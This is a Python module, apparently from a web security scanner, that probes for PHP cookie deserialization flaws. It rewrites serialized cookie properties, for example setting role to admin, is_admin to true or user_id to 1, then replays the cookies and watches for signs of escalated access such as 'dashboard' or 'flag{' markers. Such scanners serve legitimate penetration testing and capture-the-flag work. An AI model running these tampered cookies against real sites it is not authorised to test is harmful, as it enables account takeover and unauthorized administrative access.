from __future__ import annotations

import re

from ravage.probes.cookie.cookie_deserialization_cookie import _record_proof
from ravage.probes.cookie.cookie_deserialization_discovery import _php_replay_urls
from ravage.probes.cookie.cookie_deserialization_format import CookieFormat, _decode_cookie_text
from ravage.probes.cookie.cookie_deserialization_shared import _cookie_header, _request_summary
from ravage.web_core.http_probe import ProbeResponse, ProbeSession


def _tamper_php_cookie(
    session: ProbeSession,
    *,
    name: str,
    value: str,
    fmt: CookieFormat,
    cookie_jar: dict[str, str],
    findings: list[dict[str, object]],
    requests: list[dict[str, object]],
    budget: int,
) -> int:
    decoded = _decode_cookie_text(value, fmt)
    if not decoded:
        return budget
    baseline = _best_baseline(session, requests)
    for tampered, detail in _php_serialized_variants(decoded):
        if budget <= 0:
            break
        cookie_value = fmt.encode(tampered.encode("utf-8"))
        header = {"Cookie": _cookie_header(cookie_jar, name, cookie_value)}
        for url in _php_replay_urls(session):
            if budget <= 0:
                break
            budget -= 1
            response = session.get(url, headers=header)
            requests.append(
                _request_summary(response, url=url, cookie=name, gadget="php_tamper")
                | {"tamper": detail}
            )
            if _record_proof(
                response.body, findings, cookie=name, fmt=fmt, channel="php_property_tamper"
            ):
                return budget
            _record_php_tamper_signal_if_seen(
                response,
                baseline,
                findings,
                cookie=name,
                fmt=fmt,
                detail=detail,
                url=url,
            )
    return budget


def _best_baseline(session: ProbeSession, requests: list[dict[str, object]]) -> ProbeResponse:
    response = session.get(session.target_url)
    requests.append(
        _request_summary(response, url=session.target_url, cookie="", gadget="php_tamper_baseline")
    )
    return response


def _php_serialized_variants(serialized: str) -> list[tuple[str, str]]:
    variants: list[tuple[str, str]] = []
    identity_props = ("role", "roles", "user", "username", "name", "type", "account_type")
    secret_props = ("password", "pass", "pwd", "secret", "token", "auth", "key")
    for identity_prop in identity_props:
        for identity_value in ("admin", "administrator", "root"):
            identity_tampered = _replace_php_string_property(
                serialized, identity_prop, identity_value
            )
            if identity_tampered == serialized:
                continue
            for secret_prop in secret_props:
                combo = _replace_php_bool_or_int_property(identity_tampered, secret_prop)
                if combo != identity_tampered:
                    variants.append((combo, f"{identity_prop}={identity_value};{secret_prop}=true"))
    for prop in ("userid", "user_id", "uid", "id", "account_id", "member_id"):
        for value in ("1", "0", "2"):
            tampered = _replace_php_int_property(serialized, prop, value)
            if tampered != serialized:
                variants.append((tampered, f"{prop}=i:{value}"))
    for prop in identity_props:
        for value in ("admin", "administrator", "root"):
            tampered = _replace_php_string_property(serialized, prop, value)
            if tampered != serialized:
                variants.append((tampered, f"{prop}={value}"))
    for prop in secret_props:
        tampered = _replace_php_bool_or_int_property(serialized, prop)
        if tampered != serialized:
            variants.append((tampered, f"{prop}=true"))
    for prop in ("admin", "is_admin", "isAdmin", "staff", "is_staff", "is_superuser"):
        tampered = _replace_php_bool_or_int_property(serialized, prop)
        if tampered != serialized:
            variants.append((tampered, f"{prop}=true"))
    seen: set[str] = set()
    deduped: list[tuple[str, str]] = []
    for payload, detail in variants:
        if payload in seen:
            continue
        seen.add(payload)
        deduped.append((payload, detail))
    return deduped[:32]


def _php_prop_pattern(prop: str, value_pattern: str) -> re.Pattern[str]:
    return re.compile(rf's:\d+:"{re.escape(prop)}";{value_pattern}')


def _replace_php_int_property(serialized: str, prop: str, value: str) -> str:
    pattern = _php_prop_pattern(prop, r"i:-?\d+;")
    replacement = f's:{len(prop)}:"{prop}";i:{value};'
    return pattern.sub(replacement, serialized, count=1)


def _replace_php_string_property(serialized: str, prop: str, value: str) -> str:
    pattern = _php_prop_pattern(prop, r's:\d+:"[^"]*";')
    replacement = f's:{len(prop)}:"{prop}";s:{len(value)}:"{value}";'
    return pattern.sub(replacement, serialized, count=1)


def _replace_php_bool_or_int_property(serialized: str, prop: str) -> str:
    pattern = _php_prop_pattern(prop, r"(?:b:[01];|i:-?\d+;|s:\d+:\"[^\"]*\";)")
    replacement = f's:{len(prop)}:"{prop}";b:1;'
    return pattern.sub(replacement, serialized, count=1)


def _php_tamper_signal(response: ProbeResponse, baseline: ProbeResponse) -> bool:
    if (
        response.status is not None
        and baseline.status is not None
        and response.status != baseline.status
        and response.status < 400
    ):
        return True
    lowered = response.body.lower()
    baseline_lowered = baseline.body.lower()
    markers = ("admin", "dashboard", "welcome", "profile", "logout", "settings", "flag{")
    for marker in markers:
        if marker in lowered and marker not in baseline_lowered:
            return True
    return False


def _record_php_tamper_signal_if_seen(
    response: ProbeResponse,
    baseline: ProbeResponse,
    findings: list[dict[str, object]],
    *,
    cookie: str,
    fmt: CookieFormat,
    detail: str,
    url: str,
) -> None:
    if not _php_tamper_signal(response, baseline):
        return
    if _has_php_tamper_signal(findings):
        return
    findings.append(
        {
            "type": "cookie_deserialization_tamper_signal",
            "cookie": cookie,
            "format": fmt.kind,
            "tamper": detail,
            "url": url,
            "detail": ("serialized PHP object property tampering changed access or page markers"),
        }
    )


def _has_php_tamper_signal(findings: list[dict[str, object]]) -> bool:
    for finding in findings:
        if finding.get("type") == "cookie_deserialization_tamper_signal":
            return True
    return False
